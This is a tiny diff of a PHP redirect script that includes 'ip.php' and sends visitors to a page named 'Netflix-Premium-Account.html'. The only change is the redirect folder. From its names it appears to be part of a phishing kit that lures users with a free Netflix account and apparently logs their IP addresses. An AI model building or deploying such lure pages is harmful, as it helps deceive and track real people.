@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: forwarding_link/Netflix-Premium-Account.html');
+header('Location: server_link/Netflix-Premium-Account.html');
 exit
 ?>
